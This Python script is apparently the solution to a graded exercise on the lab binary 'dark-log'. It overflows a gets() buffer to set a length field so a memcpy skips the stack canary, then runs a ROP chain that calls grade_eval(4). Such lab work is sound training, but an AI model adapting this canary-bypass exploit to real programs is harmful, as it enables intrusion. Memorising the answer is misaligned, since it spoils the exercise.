#!/usr/bin/env python3
"""Task 4: Canary bypass for attack/dark-log.

struct log_frame layout used by the binary:

    rbp-0x120  expression[128]
    rbp-0x0a0  logMsg[128]
    rbp-0x020  len
    rbp-0x01c  pad[8]
    rbp-0x008  canary
    rbp+0x000  saved rbp
    rbp+0x008  return address

input() first calls gets(expression), then does
memcpy(logMsg + len, expression, 128).  `len` is at expression+0x100,
while the canary is at expression+0x118.  We send 0x104 bytes: this sets
len = 0xa0 but stops before the canary.  Consequently the 128-byte copy
starts exactly at saved rbp, overwriting the return address while leaving
the canary intact.  The copied chain then performs grade_eval(4).
"""
import struct
import sys


def p64(x: int) -> bytes:
    return struct.pack("<Q", x)


POP_RDI = 0x4018A3
RET = 0x4018A4
GRADE_EVAL = 0x401677
MAIN = 0x4017F5

chain = b""
chain += p64(0x4545454545454545)   # fake saved rbp
chain += p64(POP_RDI) + p64(4)
chain += p64(RET)
chain += p64(GRADE_EVAL)
chain += p64(MAIN)
chain += b"F" * (0x100 - len(chain))

payload = chain + struct.pack("<I", 0xA0)  # f.len = 0xa0
assert len(payload) == 0x104
assert b"\n" not in payload
sys.stdout.buffer.write(payload)
